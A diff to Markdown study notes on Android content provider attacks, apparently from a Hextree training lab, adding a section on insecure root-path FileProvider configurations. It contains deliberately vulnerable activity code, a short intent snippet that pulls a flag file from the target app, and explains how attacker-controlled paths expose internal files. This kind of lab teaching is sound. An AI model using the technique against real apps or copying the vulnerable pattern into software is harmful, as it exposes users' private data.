@@ -4,6 +4,7 @@
 - [GRANT_READ_URI_PERMISSION](#grant_read_uri_permission)
 - [Hijacking Content Provider Access](#hijacking-content-provider-access)
 - [The AndroidX FileProvider](#the-androidx-fileprovider)
+    - [How to Access FileProvider](#how-to-access-fileprovider)
 
 
 ## Overview
@@ -208,7 +209,7 @@ dump(intent.getData());
     - `other_files` which configuration entry is used
     - `/secret.txt` the path of the file relative to the configured path in the .xml file
 
-- Example: How To Access FileProvider
+### How To Access FileProvider
 ```java
 // Vulnerable Class
     public void onCreate(Bundle bundle) {
@@ -233,13 +234,13 @@ dump(intent.getData());
 ```
 - Read the flag:
 ```java
- Button button = findViewById(R.id.click);
-        button.setOnClickListener(v -> {
-            Intent intent = new Intent();
-            intent.putExtra("filename", "flags/flag34.txt");
-            intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity");
-            startActivityForResult(intent, 42);
-        });
+Button button = findViewById(R.id.click);
+button.setOnClickListener(v -> {
+    Intent intent = new Intent();
+    intent.putExtra("filename", "flags/flag34.txt");
+    intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag34Activity");
+    startActivityForResult(intent, 42);
+});
 
     
 
@@ -262,5 +263,57 @@ dump(intent.getData());
         }
     }
 ```
+
+### Insecure root-path FileProvider Config
+```java
+// Vulnerable class
+  public void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        String stringExtra = getIntent().getStringExtra("filename");
+        if (stringExtra != null) {
+            prepareFlag(this, stringExtra);
+            Uri uriForFile = FileProvider.getUriForFile(this, "io.hextree.root", new File(getFilesDir(), stringExtra));
+            Intent intent = new Intent();
+            intent.setData(uriForFile);
+            intent.addFlags(3);
+            setResult(0, intent);
+            return;
+        }
+        Uri uriForFile2 = FileProvider.getUriForFile(this, "io.hextree.root", new File(getFilesDir(), "secret.txt"));
+        Intent intent2 = new Intent();
+        intent2.setData(uriForFile2);
+        intent2.addFlags(3);
+        setResult(-1, intent2);
+    }
+
+```
+- Compare the filepaths.xml to the rootpaths.xml file provider configuration. Why is the `<root-path>` considered "insecure"?
+
+- filepaths.xml:
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<paths>
+    <files-path name="flag_files" path="flags/"/>
+    <files-path name="other_files" path="."/>
+</paths>
+```
+- Remember that the file provider configuration is used to generate file sharing URIs such as `content://io.hextree.files/other_files/secret.txt`. 
+
+- rootpaths.xml:
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<paths>
+    <root-path name="root_files" path="/"/>
+</paths>
+```
+- The file provider with a `<root-path>` configuration will generated URIs like this `content://io.hextree.files/root_files/data/data/io.hextree.attacksurface/files/secret.txt`. If we decode these sections we can see that this provider can map files of the entire filesystem.
+
+    - `content://` it's a content provider
+    - `io.hextree.root` the authority from the android manifest
+    - `root_files` which configuration entry is used
+    - `/data/data/io.hextree.attacksurface/files/secret.txt` the path of the file relative to the configured path, which is mapped to the filesystem root!
+- In itself the `<root-path>` configuration is not actually insecure, as long as only trusted files are shared. But if the app allows an attacker to control the path to any file, it can be used to expose arbitrary internal files.
+
 ## Resources
-- [Oversecured Content Provider](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers)
+- [Oversecured - Content Provider](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers)
+- [Oversecured - Android security checklist: Content Providers](https://blog.oversecured.com/Content-Providers-and-the-potential-weak-spots-they-can-have/)
